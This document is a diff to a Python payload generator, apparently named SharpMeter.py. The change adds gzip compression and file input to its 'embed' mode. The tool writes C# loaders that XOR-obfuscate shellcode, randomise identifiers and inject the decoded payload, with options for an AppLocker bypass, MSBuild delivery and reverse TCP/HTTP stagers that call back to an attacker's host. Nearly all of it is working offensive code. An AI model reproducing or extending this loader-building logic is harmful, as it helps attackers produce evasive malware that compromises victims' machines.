@@ -6,15 +6,20 @@
 # DONE: XOR option for tcp
 # DONE: shellcode stub input, ie SharpMeter.py embed 0011333377DDEEAADDBBEEAAFF
 # DONE: Variable length XOR
+# DONE: Add Compression for embed mode -c
+# DONE: File support for embed, ie SharpMeter.py embed outfile.cs in.dll
+# TODO: Better compression???
 # TODO: more options info, ie. cant use (-a with -m) or (-a with -i) etc...
 # TODO: info on hosting msbuild files
 # TODO: fix the debugging names.
 # TODO: HostHeaders/SSL...
+# TODO: dll option?
 # no bugs reports = awesome, or your lazy...
 import random
 import sys
 import argparse
 import binascii
+import os.path
 
 # define here, change later
 DEBUG = False
@@ -25,6 +30,7 @@ WINDOW_CLOSE = False
 MSBUILD = False
 INPUT_URL = False # defender?
 EMBED = False #silly options
+COMPRESS = False
 
 # banner cruft
 def opening_banner():
@@ -76,6 +82,11 @@ def write_file(fname, data):
     o = open(fname, "w")
     o.write(data)
     o.close()
+    
+def read_file(fname):
+    o = open(fname, "rb")
+    r = o.read()
+    return r
 
 def rand_str():
     ascii = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
@@ -144,10 +155,27 @@ def ms_build_check(pcode, classname):
         pcode += '}\n' # close the namespace!
         return pcode
 
+        
+def compress_class(DecompressClassName):
+    DataVar                 = random_names("DataVar")
+    ZipStream               = random_names("ZipStream")
+    resultStream            = random_names("resultStream")
+    BufferVar               = random_names("BufferVar")
+    readCounter             = random_names("readCounter")
+    ret = "public static byte[] %s(byte[] %s) {\n" % (DecompressClassName, DataVar)
+    ret += " using (var %s = new GZipStream(new MemoryStream(%s), CompressionMode.Decompress))\n" % (ZipStream, DataVar)
+    ret += " using (var %s = new MemoryStream()) {\n" % (resultStream)
+    ret += " var %s = new byte[4096];\n" % (BufferVar)
+    ret += " int %s;\n" %(readCounter)
+    ret += " while ((%s = %s.Read(%s, 0, %s.Length)) > 0) {\n" % (readCounter, ZipStream, BufferVar, BufferVar)
+    ret += "  %s.Write(%s, 0, %s);\n" % (resultStream, BufferVar, readCounter)
+    ret += "  }return %s.ToArray();}}\n" % (resultStream)
+    return ret
+
 def generate_embed(hexstream):
     xorByteVar            = random_names("xorByteVar")
     # xor_key               = random.randrange(0,255)
-    xor_key               = xor_multibyte_key(random.randrange(0,255))
+    xor_key               = xor_multibyte_key(3) #random.randrange(0,255))
     xor_key_name          = random_names("XOR_KEY")
     namespace             = random_names("NameSpaceName")
     classname             = random_names("ClassName")
@@ -167,11 +195,14 @@ def generate_embed(hexstream):
     nsName         = random_names("nsName")
     xorDataBytesName       = random_names("xorDataBytes")
     consoleWin = random_names("ConsoleWindowVariable")
+    DecompressClassName = random_names("DecompressClassName")
     r = [random_names() for x in xrange(14)]
     
     ########################################################
     ## code starts here
     payloadCode = "using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices;\n"
+    if COMPRESS:
+        payloadCode += "using System.IO.Compression; using System.IO;\n"
     if APP_LOCKER:
         payloadCode += "namespace %s {" % namespace
         payloadCode += "[System.ComponentModel.RunInstaller(true)]\n"
@@ -186,6 +217,8 @@ def generate_embed(hexstream):
     else:
         payloadCode += "namespace %s { class %s {\n" % (namespace, classname)
     # must have xor in here
+    if COMPRESS:
+        payloadCode += compress_class(DecompressClassName)
     payloadCode += "static byte[] %s(byte[] %s, byte[] %s){\n" % (genxorName, genxorByteVar, genxorKeyVar)
     payloadCode += " byte[] %s = new byte[%s.Length];\n" % (genxorReturnChar, genxorByteVar)
     payloadCode += " int v = 0;"
@@ -210,7 +243,9 @@ def generate_embed(hexstream):
     payloadCode += xor_to_format_bytes(hexstream, xorDataBytesName, xor_key)
     payloadCode += "\n"
     payloadCode += bytes_to_csharp(xor_key_name, xor_key)
-    payloadCode += "\n byte [] %s = %s(%s, %s);\n" % (un_xor_payload, genxorName, xorDataBytesName, xor_key_name)
+    payloadCode += "\n byte[] %s = %s(%s, %s);\n" % (un_xor_payload, genxorName, xorDataBytesName, xor_key_name)
+    if COMPRESS:
+        payloadCode += " %s = %s(%s);\n" % (un_xor_payload, DecompressClassName, un_xor_payload)
     payloadCode += " %s(%s);" % (injectName, un_xor_payload)
     if MSBUILD:
         payloadCode += "return true;"
@@ -222,7 +257,7 @@ def generate_embed(hexstream):
 
 def generate_http_https(LHOST, LPORT, SSL):
     thexorKey = []
-    thexorKey.append(random.randrange(0,255))
+    thexorKey.append(random.randrange(0, 255))
     # you should never have to worry about this, its mostly for debugging anyways
     namespace             = random_names("NameSpaceName")
     classname             = random_names("ClassName")
@@ -476,6 +511,7 @@ if __name__ == '__main__':
     parser.add_argument('-a', action='store_true', default=False, dest='app', help='Applocker Bypass')
     parser.add_argument('-x', action='store_true', default=False, dest='xor', help='XOR the URL')
     parser.add_argument('-m', action='store_true', default=False, dest='mbuild', help='MSBuild File!')
+    parser.add_argument('-c', action='store_true', default=False, dest='compress', help='Compression')
     parser.add_argument('-i', action='store_true', default=False, dest='inn', help='Allow Input URL')
     parser.add_argument('-d', action='store_true', default=False, dest='debug', help='Debuging')
     # it gets silly here because i changed tho arg pattern
@@ -494,6 +530,10 @@ if __name__ == '__main__':
         INPUT_URL          = nargs.inn
         DEBUG              = nargs.debug
         EMBED = True
+        COMPRESS           = nargs.compress
+        if os.path.isfile(shellcode):
+            shellcode = read_file(shellcode)
+            reverse_method = "embed_file"
     elif len(sys.argv) < 5:
         parser.print_help()
         sys.exit(0)
@@ -511,6 +551,16 @@ if __name__ == '__main__':
         DEBUG              = nargs.debug
     if reverse_method == "embed":
         payload = generate_embed(binascii.unhexlify(shellcode))
+        write_file(output_file, payload)
+    elif reverse_method == "embed_file":
+        if COMPRESS:
+            import StringIO
+            import gzip
+            out = StringIO.StringIO()
+            with gzip.GzipFile(fileobj=out, mode="w") as f:
+                f.write(shellcode)
+            shellcode = out.getvalue()
+        payload = generate_embed(shellcode)
         write_file(output_file, payload)
     elif reverse_method == "tcp":
         payload = generate_tcp(LHOST,LPORT)
